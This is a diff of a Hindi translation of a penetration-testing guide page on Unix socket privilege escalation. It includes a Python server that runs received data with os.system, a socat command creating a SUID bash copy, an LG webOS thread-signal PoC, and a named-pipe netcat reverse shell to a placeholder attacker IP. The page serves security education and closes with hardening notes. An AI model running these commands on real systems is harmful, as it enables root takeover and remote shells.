@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Python के साथ Socket binding का उदाहरण
+## Socket binding example with Python
 
-निम्नलिखित उदाहरण में एक **unix socket बनाया जाता है** (`/tmp/socket_test.s`) और जो कुछ भी **प्राप्त** होगा उसे `os.system` द्वारा **निष्पादित** किया जाएगा। मुझे पता है कि आप इसे वास्तविक दुनिया में शायद नहीं पाएँगे, लेकिन इस उदाहरण का लक्ष्य यह दिखाना है कि unix sockets का उपयोग करने वाला कोड कैसा दिखता है, और सबसे खराब स्थिति में इनपुट को कैसे संभालना है।
+निम्न उदाहरण में एक **unix socket is created** (`/tmp/socket_test.s`) और जो कुछ भी **received** होगा वह `os.system` द्वारा **executed** हो जाएगा। मुझे पता है कि आप इसे वास्तविक दुनिया में शायद नहीं पाएँगे, पर इस उदाहरण का उद्देश्य यह दिखाना है कि unix sockets का उपयोग करने वाला कोड कैसा दिखता है, और सबसे खराब संभव मामले में इनपुट को कैसे संभाला जाए।
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**कोड चलाएँ** python का उपयोग करके: `python s.py` और **जांचें कि socket कैसे सुन रहा है**:
+**कोड चलाएँ** python का उपयोग करके: `python s.py` और **जाँचें कि socket कैसे सुन रहा है**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -39,15 +39,15 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 ## केस स्टडी: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-कुछ privileged daemons एक root-owned UNIX socket एक्सपोज़ करते हैं जो untrusted input स्वीकार करता है और privileged actions को thread-IDs और signals से जोड़ता है। यदि protocol unprivileged client को यह प्रभावित करने देता है कि कौन सा native thread लक्ष्य बनता है, तो आप privileged code path ट्रिगर करके escalate कर सकते हैं।
+कुछ privileged daemons एक root-owned UNIX socket expose करते हैं जो untrusted input स्वीकार करते हैं और privileged actions को thread-IDs और signals के साथ जोड़ते हैं। अगर प्रोटोकॉल unprivileged client को यह प्रभावित करने की अनुमति देता है कि कौन सा native thread टार्गेट किया जाए, तो आप privileged code path ट्रिगर करके escalate कर सकते हैं।
 
-प्रेक्षित पैटर्न:
-- Root-owned socket से कनेक्ट करें (उदा., /tmp/remotelogger).
-- एक thread बनाएँ और उसके native thread id (TID) प्राप्त करें।
-- TID (packed) और padding एक request के रूप में भेजें; acknowledgement प्राप्त करें।
-- उस TID को एक specific signal भेजें ताकि privileged behaviour ट्रिगर हो।
+Observed pattern:
+- एक root-owned socket से कनेक्ट करें (e.g., /tmp/remotelogger).
+- एक thread बनाएं और उसका native thread id (TID) प्राप्त करें.
+- TID (packed) और padding को एक request के रूप में भेजें; acknowledgement प्राप्त करें.
+- उस TID को एक specific signal दें ताकि privileged behaviour ट्रिगर हो.
 
-न्यूनतम PoC खाका:
+Minimal PoC स्केच:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -59,14 +59,14 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-इसे root shell में बदलने के लिए, एक सरल named-pipe + nc pattern का उपयोग किया जा सकता है:
+इसे root shell में बदलने के लिए, एक सरल named-pipe + nc पैटर्न का उपयोग किया जा सकता है:
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-नोट:
-- यह बग वर्ग उन मानों पर भरोसा करने से उत्पन्न होता है जो गैर-प्रिविलेज्ड क्लाइंट स्टेट (TIDs) से निकले होते हैं और उन्हें प्रिविलेज्ड सिग्नल हैंडलरों या लॉजिक से बाइंड कर दिया जाता है।
-- मजबूत करने के लिए: socket पर credentials लागू करें, message formats को validate करें, और प्रिविलेज्ड ऑपरेशन्स को बाहरी रूप से प्रदान किए गए thread identifiers से अलग करें।
+नोट्स:
+- यह बग श्रेणी unprivileged client state (TIDs) से निकले मानों पर भरोसा करने और उन्हें privileged signal handlers या logic से बाँधने से उत्पन्न होती है।
+- सुरक्षा बढ़ाने के लिए socket पर credentials लागू करें, message formats को validate करें, और privileged operations को externally supplied thread identifiers से decouple करें।
 
 ## संदर्भ
 
